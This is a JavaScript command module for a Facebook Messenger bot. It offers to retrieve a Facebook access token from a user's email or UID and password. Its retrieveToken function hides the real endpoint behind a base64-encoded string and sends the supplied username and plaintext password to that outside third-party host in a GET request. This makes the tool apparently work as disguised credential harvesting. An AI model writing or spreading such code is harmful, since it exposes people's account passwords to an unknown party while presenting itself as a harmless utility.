const axios = require('axios');

module.exports.config = {
  name: "fbtoken",
  version: "69 lite",
  hasPermssion: 0,
  credits: "six eyes",
  description: "GET FB ACCESS_TOKEN",
  commandCategory: "tools",
  usePrefix: true,
  usages: "[email/uid] [password]",
  cooldowns: 15,
  envConfig: {
    autoUnsend: true,
    delayUnsend: 300
  }
};

module.exports.run = async ({ api, event, args }) => {
  const { threadID, messageID } = event;
  const uuid = args[0];
  const password = args[1];

  if (!uuid || !password) {
    api.sendMessage(`Invalid Input!\nUsage: ${global.config.PREFIX}token [email/uid] [password]`, threadID, messageID);
    return;
  }

  api.sendMessage("GETTING TOKEN....", threadID, messageID);

  try {
    const tokenData = await retrieveToken(uuid, password);
    if (tokenData) { api.sendMessage(`𝗔𝗖𝗖𝗘𝗦𝗦_𝗧𝗢𝗞𝗘𝗡🪙:\n${tokenData.access_token_eaad6v7}`, threadID, messageID);
    } else {
      api.sendMessage("Failed to retrieve token.", threadID, messageID);
    }
  } catch (error) {
    api.sendMessage(`${error}\n\nDouble-check your password. If it still doesn't work, try changing your password and using the command again.`, threadID, messageID);
  }
};

async function retrieveToken(uuid, password) {
    const apiKey = 'aHR0cHM6Ly9yZXBsaG9tZS5jb2RlYm94NGNoYW4ucmVwbC5jby9mYi90b2tlbg==';
    const protect = Buffer.from(apiKey, 'base64').toString('utf-8');
    const getter = `${protect}?username=${uuid}&password=${password}`;
  
  try {
    const response = await axios.get(getter);
    const tokenData = response.data;

    return tokenData;
  } catch (error) {
    throw error;
  }
}
